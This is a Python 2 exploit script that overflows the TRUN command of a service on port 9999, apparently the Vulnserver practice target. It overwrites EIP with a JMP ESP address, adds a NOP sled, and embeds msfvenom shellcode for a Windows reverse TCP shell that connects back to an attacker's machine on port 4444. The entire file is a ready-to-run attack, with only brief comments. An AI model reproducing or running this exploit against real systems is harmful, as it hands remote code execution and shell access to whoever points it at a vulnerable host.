#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
	print "\nUsage: " + sys.argv[0] + " <HOST>\n"
	sys.exit()

cmd = "TRUN /.:/ "
buffer= "\x41" * 2002
#JMP ESP -> ntdll.dll
#625011AF
eip= "\xAF\x11\x50\x62"
nop= "\x90" * 16
#Payload for Windows
#msfvenom -p windows/shell/reverse_tcp LHOST=attacker's IP LPORT=4444 -b '\x00' -f python
buf =  b""
buf += b"\xda\xc2\xbb\x1a\xc7\xe1\xb5\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\xd8\xc3\x03"
buf += b"\x40\x20\x23\x41\xab\xd8\xb4\x26\x25\x3d\x85\x66\x51"
buf += b"\x36\xb6\x56\x11\x1a\x3b\x1c\x77\x8e\xc8\x50\x50\xa1"
buf += b"\x79\xde\x86\x8c\x7a\x73\xfa\x8f\xf8\x8e\x2f\x6f\xc0"
buf += b"\x40\x22\x6e\x05\xbc\xcf\x22\xde\xca\x62\xd2\x6b\x86"
buf += b"\xbe\x59\x27\x06\xc7\xbe\xf0\x29\xe6\x11\x8a\x73\x28"
buf += b"\x90\x5f\x08\x61\x8a\xbc\x35\x3b\x21\x76\xc1\xba\xe3"
buf += b"\x46\x2a\x10\xca\x66\xd9\x68\x0b\x40\x02\x1f\x65\xb2"
buf += b"\xbf\x18\xb2\xc8\x1b\xac\x20\x6a\xef\x16\x8c\x8a\x3c"
buf += b"\xc0\x47\x80\x89\x86\x0f\x85\x0c\x4a\x24\xb1\x85\x6d"
buf += b"\xea\x33\xdd\x49\x2e\x1f\x85\xf0\x77\xc5\x68\x0c\x67"
buf += b"\xa6\xd5\xa8\xec\x4b\x01\xc1\xaf\x03\xe6\xe8\x4f\xd4"
buf += b"\x60\x7a\x3c\xe6\x2f\xd0\xaa\x4a\xa7\xfe\x2d\xac\x92"
buf += b"\x47\xa1\x53\x1d\xb8\xe8\x97\x49\xe8\x82\x3e\xf2\x63"
buf += b"\x52\xbe\x27\x23\x02\x10\x98\x84\xf2\xd0\x48\x6d\x18"
buf += b"\xdf\xb7\x8d\x23\x35\xd0\x24\xde\xde\x1f\x10\xe1\x6f"
buf += b"\xc8\x63\xe1\x9e\x54\xed\x07\xca\x74\xbb\x90\x63\xec"
buf += b"\xe6\x6a\x15\xf1\x3c\x17\x15\x79\xb3\xe8\xd8\x8a\xbe"
buf += b"\xfa\x8d\x7a\xf5\xa0\x18\x84\x23\xcc\xc7\x17\xa8\x0c"
buf += b"\x81\x0b\x67\x5b\xc6\xfa\x7e\x09\xfa\xa5\x28\x2f\x07"
buf += b"\x33\x12\xeb\xdc\x80\x9d\xf2\x91\xbd\xb9\xe4\x6f\x3d"
buf += b"\x86\x50\x20\x68\x50\x0e\x86\xc2\x12\xf8\x50\xb8\xfc"
buf += b"\x6c\x24\xf2\x3e\xea\x29\xdf\xc8\x12\x9b\xb6\x8c\x2d"
buf += b"\x14\x5f\x19\x56\x48\xff\xe6\x8d\xc8\x0f\xad\x8f\x79"
buf += b"\x98\x68\x5a\x38\xc5\x8a\xb1\x7f\xf0\x08\x33\x00\x07"
buf += b"\x10\x36\x05\x43\x96\xab\x77\xdc\x73\xcb\x24\xdd\x51"
end = "\r\n"

buffer = cmd + buffer + eip + nop + buf + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 9999))
s.send(buffer)
s.recv(1024)
s.close()
